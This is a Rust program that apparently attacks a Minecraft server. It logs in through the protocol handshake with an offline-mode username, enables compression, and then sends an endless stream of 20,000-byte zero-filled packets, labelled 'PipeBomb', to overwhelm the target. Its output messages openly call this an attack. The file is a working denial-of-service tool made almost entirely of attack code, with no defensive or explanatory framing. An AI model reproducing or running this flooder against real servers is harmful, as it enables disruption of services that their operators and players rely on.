use std::time::Duration;

use anyhow::Context;
use futures::{SinkExt, StreamExt, TryStreamExt};
use netherite::{
    Deserialize, Serialize,
    codec::{compressed::CompressedCodec, uncompressed::UncompressedCodec},
    encoding::{packetid::PacketId, str::Str, varint::VarInt},
    packet::RawPacket,
};
use tokio::net::{TcpSocket, TcpStream};
use tokio_util::codec::Framed;

#[derive(Serialize)]
struct Handshake {
    protocol_version: VarInt,
    server_address: String,
    server_port: u16,
    next_state: u8,
}

impl PacketId for Handshake {
    const ID: i32 = 0x00;
}

struct Uuid([u8; 16]);

impl Serialize for Uuid {
    fn serialize(&self, mut buf: impl netherite::_bytes_export::BufMut) {
        buf.put_slice(&self.0[..]);
    }

    fn size(&self) -> usize {
        16
    }
}

#[derive(Serialize)]
struct LoginStart {
    username: String,
    uuid: Uuid,
}

impl PacketId for LoginStart {
    const ID: i32 = 0x00;
}

#[derive(Deserialize)]
struct SetCompression {
    treshold: VarInt,
}

impl PacketId for SetCompression {
    const ID: i32 = 0x03;
}

#[derive(Deserialize)]
struct LoginSuccess {}

impl PacketId for LoginSuccess {
    const ID: i32 = 0x02;
}

#[derive(Serialize)]
struct LoginAcknowledge;

impl PacketId for LoginAcknowledge {
    const ID: i32 = 0x03;
}

#[derive(Deserialize)]
struct Disconnect {
    reason: Str,
}

impl PacketId for Disconnect {
    const ID: i32 = 0x00;
}

struct PipeBomb {
    size: usize,
}

impl PacketId for PipeBomb {
    const ID: i32 = 0x8c;
}

impl Serialize for PipeBomb {
    fn serialize(&self, mut buf: impl tokio_util::bytes::BufMut) {
        buf.put_bytes(0, self.size);
    }

    fn size(&self) -> usize {
        self.size
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let address = std::env::args().nth(1).unwrap();
    println!("attacking {address}");
    let connection = TcpStream::connect(&address).await?;
    let mut connection = Framed::new(connection, UncompressedCodec::default());

    let (address, port) = address.split_once(':').unwrap();

    connection
        .send(Handshake {
            server_address: address.to_string(),
            protocol_version: VarInt(765),
            server_port: 25565,
            next_state: 0x02,
        })
        .await?;

    let uuid = *uuid_mc::PlayerUuid::new_with_offline_username("jsadjajsjdak").as_bytes();
    let uuid = Uuid(uuid);

    connection
        .send(LoginStart {
            username: "jsadjajsjdak".to_string(),
            uuid,
        })
        .await?;

    let set_compression = connection.next().await.unwrap()?;
    let set_compression = match set_compression.packet_id {
        0x03 => set_compression.deserialize_unchecked::<SetCompression>()?,
        _ => anyhow::bail!("Exited with message: {set_compression:?}"),
    };

    let mut connection = connection
        .map_codec(|_| CompressedCodec::default().compression(set_compression.treshold.0 as usize));

    connection
        .next()
        .await
        .unwrap()?
        .is::<LoginSuccess>()
        .then_some(())
        .context("login was not success")?;

    connection.send(LoginAcknowledge).await?;

    let packet: RawPacket = PipeBomb { size: 20000 }.into();
    let (mut writer, mut reader) = connection.split::<RawPacket>();

    tokio::spawn(async move {
        while let Some(packet) = reader.try_next().await.unwrap() {
            dbg!(packet);
        }
    });

    println!("Starting to fuck!");

    loop {
        writer.send(packet.clone()).await?;
    }
}
